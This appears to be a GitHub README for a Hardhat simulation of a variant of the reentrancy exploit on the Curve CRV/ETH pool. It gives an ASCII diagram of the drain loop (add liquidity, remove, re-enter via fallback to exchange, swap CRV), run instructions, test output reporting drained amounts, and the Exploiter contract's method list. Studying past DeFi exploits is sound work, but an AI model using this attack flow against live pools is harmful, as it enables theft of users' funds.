# Curve CRV/ETH pool exploit variation

A variation of  exploit with only exchange inside fallback function and some and numerical differences with amounts

scheme:
                        the main drying loop

                              action 1
      exploiter contract --- add 1 ETH ----→ CRV/ETH pool ←----------------
          |      ↑                              |    ↑                    |
          |      |             action 2         |    |                    |
          |      |_________remove position______|    |                    |
          |                      |                   |                    |
          |                      ↓                   |    action 2.5      |
          |                exploiter.fallback() ------exchange 190 ETH    |
          |                                                               |
          |                                                               |
          |                           action 3                            |
          |_______________________exchange all CRVs_______________________|


First put RPC_URL and COINMARKETCAP apikey into .env file, then try running this:
```shell
npx hardhat test
```
You should get smth like that:
```shell
  exploit simulation
    execute:        
Drained from pool:
CRV:  22046979n
ETH:  9873n    
      √ Should eploit the CRV/ETH pool (14917ms)

·-----------------------------------------------------------------------|----------------------------|-------------|-----------------------------·
|                         Solc version: 0.8.19                          ·  Optimizer enabled: false  ·  Runs: 200  ·  Block limit: 30000000 gas  │      
········································································|····························|·············|······························      
|  Methods                                                              ·               37 gwei/gas                ·       1842.43 usd/eth       │      
··············|·························································|··············|·············|·············|···············|··············      
|  Contract   ·  Method                                                 ·  Min         ·  Max        ·  Avg        ·  # calls      ·  usd (avg)  │      
··············|·························································|··············|·············|·············|···············|··············      
|  Exploiter  ·  execute(address[],uint256[],bytes)                     ·           -  ·          -  ·   21411811  ·            1  ·    1459.64  │      
··············|·························································|··············|·············|·············|···············|··············      
|  Exploiter  ·  owner()                                                ·           -  ·          -  ·          -  ·            0  ·          -  │      
··············|·························································|··············|·············|·············|···············|··············      
|  Exploiter  ·  receiveFlashLoan(address[],uint256[],uint256[],bytes)  ·           -  ·          -  ·          -  ·            0  ·          -  │      
··············|·························································|··············|·············|·············|···············|··············      
|  Exploiter  ·  renounceOwnership()                                    ·           -  ·          -  ·          -  ·            0  ·          -  │      
··············|·························································|··············|·············|·············|···············|··············      
|  Exploiter  ·  transferOwnership(address)                             ·           -  ·          -  ·          -  ·            0  ·          -  │      
··············|·························································|··············|·············|·············|···············|··············      
|  Exploiter  ·  withdraw(address,address)                              ·           -  ·          -  ·          -  ·            0  ·          -  │      
··············|·························································|··············|·············|·············|···············|··············      
|  Deployments                                                          ·                                          ·  % of limit   ·             │      
········································································|··············|·············|·············|···············|··············      
|  Exploiter                                                            ·           -  ·          -  ·    1643946  ·        5.5 %  ·     112.07  │      
·-----------------------------------------------------------------------|--------------|-------------|-------------|---------------|-------------·      

  1 passing (15s)
```
Try to manipulate numbers in (./contracts/exploiter.sol)[https://github.com/kotik98/crv-eth_exploit/blob/main/contracts/exploiter.sol] to get another results! 


